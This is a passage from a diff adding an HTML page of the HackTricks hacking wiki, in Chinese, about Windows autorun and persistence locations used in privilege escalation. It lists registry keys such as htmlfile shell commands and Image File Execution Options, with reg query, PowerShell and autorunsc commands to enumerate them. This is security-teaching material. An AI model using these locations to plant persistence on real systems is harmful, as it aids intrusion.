+<li><code>HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command</code></li>
+</ul>
+<pre><code class="language-bash">reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
+reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
+Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
+Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
+</code></pre>
+<h3 id="图像文件执行选项"><a class="header" href="#图像文件执行选项">图像文件执行选项</a></h3>
+<pre><code>HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
+HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
+</code></pre>
+<h2 id="sysinternals"><a class="header" href="#sysinternals">SysInternals</a></h2>
+<p>请注意，您可以找到 autoruns 的所有站点 <strong>已经被</strong><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe"> <strong>winpeas.exe</strong></a> <strong>搜索过</strong>。然而，对于 <strong>更全面的自动执行</strong> 文件列表，您可以使用来自 Sysinternals 的 <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns">autoruns</a>：</p>
+<pre><code>autorunsc.exe -m -nobanner -a * -ct /accepteula
+</code></pre>
+<h2 id="更多"><a class="header" href="#更多">更多</a></h2>
+<p><strong>在</strong> <a href="https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&amp;seqNum=2"><strong>https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&amp;seqNum=2</strong></a> <strong>中查找更多类似的自动运行注册表。</strong></p>
+<h2 id="参考文献"><a class="header" href="#参考文献">参考文献</a></h2>
+<ul>
+<li><a href="https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref">https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref</a></li>
+<li><a href="https://attack.mitre.org/techniques/T1547/001/">https://attack.mitre.org/techniques/T1547/001/</a></li>
+<li><a href="https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&amp;seqNum=2">https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&amp;seqNum=2</a></li>
+<li><a href="https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell">https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell</a></li>
+</ul>
+<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>
+<p><strong>漏洞赏金提示</strong>：<strong>注册</strong> <strong>Intigriti</strong>，一个由黑客为黑客创建的高级<strong>漏洞赏金平台</strong>！今天就加入我们，访问 <a href="https://go.intigriti.com/hacktricks"><strong>https://go.intigriti.com/hacktricks</strong></a>，开始赚取高达**$100,000**的赏金！</p>
+<p>{% embed url="https://go.intigriti.com/hacktricks" %}</p>
+<p>{% hint style="success" %}
+学习与实践 AWS 黑客攻击：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
+学习与实践 GCP 黑客攻击： <img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
+<details>
+<summary>支持 HackTricks</summary>
+<ul>
+<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
+<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>电报群组</strong></a> 或 <strong>在</strong> <strong>Twitter</strong> 🐦 <strong>上关注我们</strong> <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
+<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github 仓库提交 PR 来分享黑客技巧。</li>
+</ul>
+</details>
+{% endhint %}
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../windows-hardening/windows-local-privilege-escalation/named-pipe-client-impersonation.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="../../windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../windows-hardening/windows-local-privilege-escalation/named-pipe-client-impersonation.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="../../windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../../elasticlunr.min.js"></script>
+        <script src="../../mark.min.js"></script>
+        <script src="../../searcher.js"></script>
+
+        <script src="../../clipboard.min.js"></script>
+        <script src="../../highlight.js"></script>
+        <script src="../../book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </div>
+    </body>
+</html>
